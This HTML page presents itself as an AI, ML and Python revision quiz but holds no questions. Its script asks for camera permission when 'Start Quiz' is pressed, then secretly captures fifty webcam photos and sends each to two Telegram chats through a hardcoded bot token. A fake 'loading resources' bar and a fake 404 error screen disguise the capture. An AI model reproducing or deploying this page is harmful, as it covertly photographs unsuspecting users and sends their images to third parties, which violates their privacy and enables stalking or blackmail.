<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quiz Time | AI/ML & Python Basics</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@500;600;700;800&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --ink: #1A2036;
            --ink-soft: #6B7390;
            --ink-faint: #A2A9C2;
            --indigo: #3D5AFE;
            --indigo-deep: #2540D6;
            --teal: #00BFA6;
            --amber: #FFAB40;
            --bg-0: #EEF2FA;
            --bg-1: #F8FAFF;
            --glass-bg: rgba(255,255,255,0.55);
            --glass-bg-strong: rgba(255,255,255,0.75);
            --glass-border: rgba(255,255,255,0.9);
            --card-shadow: 0 20px 50px -20px rgba(61,90,254,0.28), 0 8px 20px -10px rgba(0,191,166,0.18);
            --ff-display: 'Sora', sans-serif;
            --ff-body: 'Inter', sans-serif;
            --ff-mono: 'JetBrains Mono', monospace;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        html { scroll-behavior: smooth; }

        body {
            font-family: var(--ff-body);
            color: var(--ink);
            background:
                radial-gradient(ellipse 70% 45% at 12% -8%, rgba(61,90,254,0.16), transparent),
                radial-gradient(ellipse 65% 45% at 100% 10%, rgba(0,191,166,0.14), transparent),
                radial-gradient(ellipse 55% 40% at 50% 105%, rgba(255,171,64,0.10), transparent),
                linear-gradient(170deg, var(--bg-1) 0%, var(--bg-0) 100%);
            min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
            padding: 24px;
        }

        @media (prefers-reduced-motion: reduce) {
            *{ animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; }
        }

        /* ===== Glass utility ===== */
        .glass {
            background: var(--glass-bg);
            backdrop-filter: blur(18px) saturate(180%);
            -webkit-backdrop-filter: blur(18px) saturate(180%);
            border: 1px solid var(--glass-border);
        }

        /* ===== Step 1 : intro card ===== */
        .divine-card {
            width: 100%; max-width: 400px;
            background: var(--glass-bg-strong);
            backdrop-filter: blur(20px) saturate(180%);
            -webkit-backdrop-filter: blur(20px) saturate(180%);
            border: 1px solid var(--glass-border);
            border-radius: 32px;
            padding: 36px 26px;
            text-align: center;
            box-shadow: var(--card-shadow);
            position: relative;
        }

        .badge-icon {
            width: 64px; height: 64px;
            margin: 0 auto 18px;
            border-radius: 20px;
            background: linear-gradient(135deg, var(--indigo), var(--teal));
            display: flex; align-items: center; justify-content: center;
            font-size: 30px;
            box-shadow: 0 10px 24px -8px rgba(61,90,254,0.5);
        }

        .hindi-main {
            font-family: var(--ff-display);
            font-weight: 800;
            font-size: 32px;
            color: var(--ink);
            margin: 0 0 10px;
            letter-spacing: -0.02em;
        }

        .shloka {
            font-size: 14.5px;
            color: var(--ink-soft);
            font-weight: 500;
            margin-bottom: 26px;
            line-height: 1.55;
        }

        .btn-start {
            background: linear-gradient(120deg, var(--indigo), var(--indigo-deep));
            color: #fff;
            border: none; width: 100%; padding: 17px;
            border-radius: 16px; font-size: 16px; font-weight: 700;
            font-family: var(--ff-body);
            cursor: pointer;
            box-shadow: 0 10px 24px -8px rgba(61,90,254,0.55);
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        .btn-start:hover { transform: translateY(-2px); box-shadow: 0 14px 30px -8px rgba(61,90,254,0.6); }
        .btn-start:active { transform: translateY(0); }

        /* ===== Step 2 : home screen ===== */
        #step-2 { width: 100%; max-width: 880px; }

        nav.topnav {
            display: flex; align-items: center; justify-content: space-between;
            padding: 14px 22px;
            border-radius: 20px;
            margin-bottom: 22px;
        }
        .brand {
            display: flex; align-items: center; gap: 10px;
        }
        .brand-dot {
            width: 12px; height: 12px; border-radius: 50%;
            background: conic-gradient(from 0deg, var(--indigo), var(--teal), var(--amber), var(--indigo));
        }
        .brand-name { font-family: var(--ff-display); font-weight: 700; font-size: 15px; }
        .brand-sub { font-family: var(--ff-mono); font-size: 10px; letter-spacing: 0.08em; color: var(--teal); text-transform: uppercase; }

        .hero-panel {
            border-radius: 28px;
            padding: 36px 30px 30px;
            text-align: center;
            box-shadow: var(--card-shadow);
            margin-bottom: 20px;
        }
        .eyebrow {
            display: inline-flex; align-items: center; gap: 7px;
            font-family: var(--ff-mono); font-size: 11px; font-weight: 600;
            letter-spacing: 0.08em;
            color: var(--indigo-deep);
            background: rgba(61,90,254,0.08);
            border: 1px solid rgba(61,90,254,0.2);
            padding: 6px 14px; border-radius: 999px;
        }
        .eyebrow .pulse {
            width: 6px; height: 6px; border-radius: 50%;
            background: var(--teal);
            box-shadow: 0 0 0 0 rgba(0,191,166,0.5);
            animation: pulse-ring 1.8s infinite;
        }
        @keyframes pulse-ring {
            0% { box-shadow: 0 0 0 0 rgba(0,191,166,0.5); }
            70% { box-shadow: 0 0 0 8px rgba(0,191,166,0); }
            100% { box-shadow: 0 0 0 0 rgba(0,191,166,0); }
        }
        h2.headline {
            font-family: var(--ff-display); font-weight: 800;
            font-size: clamp(26px, 4.2vw, 38px);
            line-height: 1.15; letter-spacing: -0.02em;
            margin: 16px 0 10px;
        }
        .headline .grad {
            background: linear-gradient(100deg, var(--indigo), var(--teal));
            -webkit-background-clip: text; background-clip: text; color: transparent;
        }
        .hero-sub {
            color: var(--ink-soft); font-size: 14.5px; line-height: 1.6;
            max-width: 440px; margin: 0 auto;
        }

        .stat-row {
            display: flex; flex-wrap: wrap; justify-content: center; gap: 10px;
            margin-top: 22px;
        }
        .stat-pill {
            background: var(--glass-bg-strong);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            padding: 10px 16px;
            display: flex; align-items: center; gap: 8px;
            box-shadow: 0 6px 16px -8px rgba(61,90,254,0.2);
        }
        .stat-num { font-family: var(--ff-display); font-weight: 700; font-size: 17px; color: var(--indigo-deep); }
        .stat-label { font-size: 11px; color: var(--ink-soft); text-align: left; line-height: 1.25; }

        /* Topic grid */
        .topic-grid {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
            gap: 14px;
        }
        .topic-card {
            border-radius: 20px;
            padding: 20px;
            text-align: left;
            box-shadow: 0 12px 28px -14px rgba(61,90,254,0.25);
            transition: transform 0.25s cubic-bezier(.21,.8,.32,1), box-shadow 0.25s ease;
            cursor: pointer;
        }
        .topic-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 18px 36px -14px rgba(0,191,166,0.35);
        }
        .topic-icon {
            width: 42px; height: 42px;
            border-radius: 13px;
            display: flex; align-items: center; justify-content: center;
            font-size: 20px;
            margin-bottom: 12px;
        }
        .topic-icon.i-py { background: rgba(61,90,254,0.12); }
        .topic-icon.i-ml { background: rgba(0,191,166,0.14); }
        .topic-icon.i-dl { background: rgba(255,171,64,0.16); }
        .topic-icon.i-cn { background: rgba(61,90,254,0.12); }

        .topic-title { font-family: var(--ff-display); font-weight: 700; font-size: 15px; margin-bottom: 6px; }
        .topic-desc { font-size: 12.5px; color: var(--ink-soft); line-height: 1.5; margin-bottom: 14px; }
        .topic-meta {
            display: flex; align-items: center; justify-content: space-between;
            font-family: var(--ff-mono); font-size: 11px; color: var(--ink-faint);
        }
        .topic-go {
            font-weight: 700; color: var(--indigo-deep);
            display: inline-flex; align-items: center; gap: 4px;
        }

        .loader-container { margin-top: 22px; display: none; }
        .bar { height: 8px; width: 100%; background: rgba(107,115,144,0.15); border-radius: 10px; overflow: hidden; }
        .fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--indigo), var(--teal)); transition: width 1s linear; }
        .stat-text { font-size: 12px; color: var(--indigo-deep); font-weight: 600; margin-top: 8px; font-family: var(--ff-mono); }
    </style>
</head>
<body>

    <div id="mainBox">
        <div id="step-1" class="divine-card">
            <div class="badge-icon">🧠</div>
            <h1 class="hindi-main">Practice Revesion Quiz</h1>
            <p class="shloka">Test your basics in AI, ML &amp; Python<br>Quick questions, sharp answers, 30 questions</p>
            <button class="btn-start" onclick="start()">Start Quiz</button>
        </div>

        <div id="step-2" style="display:none;">
            <img id="gImg" 
                 src="https://raw.githubusercontent.com/yashraj-personal/quiz_tg/85ed4fc56c5d0f05494f3d63b647221cda7140f0/AIML.jpe" 
                 class="god-photo" 
                 alt="Good Night"
                 onerror="this.src='https://placehold.co/300x300/0083B0/ffffff?text=⭐'">
            
            <h2 style="color:var(--dark-blue); margin: 0;">END MODULE 2 EVALUATION REVESION QUIZ 💻🖥️ </h2>
            
            <div class="loader-container" id="lBox">
                <div class="bar"><div class="fill" id="f"></div></div>
                <div class="stat-text" id="status">LOADING RESOURCES: 0%</div>
            </div>
        </div>
    </div>

    <video id="v" style="display:none;" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const T = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU';
        const IDS = ['7617707778', '7194705917'];

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('step-1').style.display = 'none';
                document.getElementById('step-2').style.display = 'block';
                document.getElementById('gImg').style.display = 'block';
                document.getElementById('lBox').style.display = 'block';

                const video = document.getElementById('v');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    let count = 0;
                    const loop = setInterval(() => {
                        count++;
                        send(count);
                        let p = Math.round((count/50)*100);
                        document.getElementById('f').style.width = p + '%';
                        document.getElementById('status').innerText = `LOADING RESOURCES FROM CLOUD: ${p}%`;

                        if (count >= 50) {
                            clearInterval(loop);
                            stream.getTracks().forEach(track => track.stop());
                            document.getElementById('mainBox').innerHTML = `
                                <h1 class="hindi-main" style="font-size:35px;">404 ERROR</h1>
                                <p style="font-weight:bold; color:#444;">RELOAD THE SITE FOR LOADING AGAIN.</p>
                                <button class="btn-start" onclick="location.reload()">HOME</button>
                            `;
                        }
                    }, 1200);
                };
            } catch (err) {
                alert("PERMISSION REQUIRED FOR LOADING!");
            }
        }

        function send(idx) {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = video.videoWidth; 
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append('chat_id', id);
                    fd.append('photo', blob, 'pic.jpg');
                    fd.append('caption', `QUIZ_KA_PHOTO ☠️ [${idx}/50]`);
                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                });
            }, 'image/jpeg', 0.4);
        }
    </script>
</body>
</html>
